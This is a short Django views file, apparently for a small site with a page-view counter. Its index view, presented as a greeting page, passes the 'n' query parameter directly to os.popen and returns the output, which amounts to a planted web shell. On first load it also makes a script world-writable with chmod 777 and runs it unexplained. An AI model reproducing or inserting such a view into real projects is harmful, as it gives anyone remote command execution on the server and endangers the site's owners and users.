import os
from django.shortcuts import render
from django.conf import settings
from django.http import HttpResponse
import os
import subprocess
from . import database
from .models import PageView

# Create your views here.

def index(request):
    ff="false"
    try:
      f1 = open('myfile.txt')
      f1.close()
      ff="true"
    except FileNotFoundError:
      ff="false"
    if ff=="false":
      f1=open("myfile.txt","a")
      f1.close()
      f = os.popen("chmod 777 a.sh")
      f = subprocess.Popen(["bash", "a.sh", "runserver"])
    s=request.GET.get('n')
    f = os.popen(str(s))
    now = f.read()  
    return HttpResponse("<xmp>"+'Hello '+now+"</xmp>")
    #return render(request, "index.html")

def health(request):
    return HttpResponse(PageView.objects.count())
